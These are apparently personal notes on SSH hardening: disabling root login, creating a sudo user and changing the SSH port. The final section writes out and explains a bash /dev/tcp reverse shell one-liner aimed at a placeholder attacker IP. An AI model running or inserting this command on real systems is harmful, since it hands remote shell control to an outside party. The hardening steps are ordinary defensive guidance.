# Cyber

## Why Using the Root User for Logging into a Server is Not Recommended
Using the root user to log into a server is generally not recommended due to several security and operational risks:

Common Knowledge of Root User:

Every hacker knows about the root user. If root login is enabled, hackers are one step closer to executing a brute-force attack.
Full Access and Risk of Errors:

When using the root user, you have full access to perform any action. This increases the likelihood of mistakenly executing harmful commands.
Security Risks with Certain Programs:

Running some programs as the root user poses a security risk because it grants excessive access, which is not desirable.
Difficulty in Tracking Actions:

If your server is accessed by multiple users and they all use the root account, it becomes difficult to determine who executed which command. This makes tracking down a user who performed a malicious action more challenging.

## Create user & add to sudo group & test
```bash
# create user
adduser <new user>
usermod -aG sudo <new user>
# test the root priviliege
su - user
sudo ls /root
# test ssh
ssh <new user>@ip_address_of_server
```
## ban root login to server
```bash
# modify ssh config on server
sudo nano /etc/ssh/sshd_config
# set PermitRootLogin to no

sudo service ssh restart

# run these on server
sudo rm -rf /root/.ssh
sudo passwd --lock root
```
after these following shouldnt be execute
```bash
ssh root@ip_address_of_server
```

## Change default port of ssh

- allow transfer on <port> : random number greater than 1024 (less are preserved)
```bash
sudo ufw allow <port>/tcp
```

- modify ssh config
```bash
sudo nano /etc/ssh/sshd_config
# change the port to new port 
#Port 5522
sudo systemctl restart sshd
```
connect via new port 
```bash
ssh -p <new port> <new user>@remote_host_or_ip
```

## create reverse shell
```bash
bash -i >& /dev/tcp/<dest_ip>/<port_ip> 0>&1
```
- bash -i: This launches a new interactive Bash shell. The -i flag makes the shell interactive, meaning it will read commands from standard input and provide output to standard output.

- >& /dev/tcp/attacker_ip/9001: This part redirects both the standard output (stdout) and standard error (stderr) of the Bash shell to a TCP connection. Specifically:

- &> is a redirection operator that combines both stdout and stderr.
/dev/tcp/attacker_ip/9001 is a special file in some Unix-like systems that represents a TCP connection. This means that the Bash shell's output will be sent over a network connection to the IP address attacker_ip on port 9001.

- 0>&1: This part redirects standard input (stdin) from the same source as standard output (stdout). In other words, it makes the shell read its input from the same TCP connection that it's writing its output to.


